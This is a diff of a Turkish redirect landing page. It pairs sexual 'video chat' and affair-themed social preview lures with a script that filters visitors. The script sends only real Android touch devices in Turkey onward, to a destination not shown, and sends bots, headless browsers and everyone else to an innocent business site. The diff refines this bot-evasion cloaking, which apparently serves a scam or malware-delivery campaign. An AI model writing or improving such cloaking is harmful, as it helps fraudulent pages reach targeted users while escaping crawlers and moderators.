@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <title>Yönlendiriliyorsunuz...</title>
   <meta name="robots" content="noindex, nofollow">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
   <!-- Yandex Metrika -->
   <script type="text/javascript">
@@ -16,16 +16,15 @@
   </script>
 
   <!-- Sosyal Önizleme -->
+  <meta property="og:title" content="pıttığım çok azdı">
+  <meta property="og:description" content="Görüntülü sohbetin en hızlı ve eğlenceli adresi">
+  <meta property="og:image" content="https://elleader.vercel.app/asd.jpg">
+  <meta property="og:url" content="https://elleader.vercel.app">
+  <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="GÖRÜNTÜLÜ KONUŞMAK İÇİN TIKLA">
   <meta name="twitter:description" content="Kaçamak mı yapmak istiyorsunuz tam size göre !">
   <meta name="twitter:image" content="https://elleader.vercel.app/asd.jpg">
-
-  <meta property="og:image" content="https://elleader.vercel.app/asd.jpg">
-  <meta property="og:url" content="https://elleader.vercel.app">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="pıttığım çok azdı">
-  <meta property="og:description" content="Görüntülü sohbetin en hızlı ve eğlenceli adresi">
 
   <style>
     body {
@@ -51,36 +50,28 @@
   </style>
 
   <script>
-    // ✅ Android cihaz tespiti (Geniş kapsama)
+    // Android cihaz tespiti (Gelişmiş)
     function isRealAndroid() {
       const ua = navigator.userAgent.toLowerCase();
-      const keywords = [
-        'android', 'linux; android', 'samsung', 'sm-', 'huawei', 'honor', 'xiaomi', 'mi', 'redmi',
-        'poco', 'oppo', 'vivo', 'realme', 'oneplus', 'lenovo', 'zte', 'meizu', 'nokia', 'tecno',
-        'infinix', 'doogee', 'ulefone', 'leeco', 'coolpad', 'alcatel', 'asus', 'philips',
-        'motorola', 'sony', 'lg'
-      ];
-      const match = keywords.some(k => ua.includes(k));
       const touch = 'ontouchstart' in window;
-      const bot = navigator.webdriver;
+      const bot = navigator.webdriver || /HeadlessChrome|PhantomJS/i.test(ua);
 
-      return match && touch && !bot;
+      // Daha esnek eşleşme
+      return ua.includes('android') && !bot && touch;
     }
 
-    // 🌍 Türkiye kontrolü (Fallback'li)
+    // Türkiye kontrolü
     async function isFromTurkey() {
       try {
-        const res = await fetch('https://api.country.is');
-        if (!res.ok) return true; // hata varsa TR kabul et
-        const json = await res.json();
-        return json.country === 'TR';
+        const res = await fetch("https://api.country.is");
+        const data = await res.json();
+        return data.country === "TR";
       } catch {
-        return true; // fallback: hata varsa TR say
+        return true; // fallback
       }
     }
 
-    // 🚀 Yönlendirme işlemi
-    setTimeout(async () => {
+    async function redirect() {
       const android = isRealAndroid();
       const turkey = await isFromTurkey();
 
@@ -95,7 +86,12 @@
       } else {
         window.location.href = "https://www.kocalar.com.tr/";
       }
-    }, 500 + Math.random() * 1000);
+    }
+
+    // Başlat
+    window.addEventListener('load', () => {
+      setTimeout(redirect, 800); // Azıcık bekletme
+    });
   </script>
 </head>
 <body>
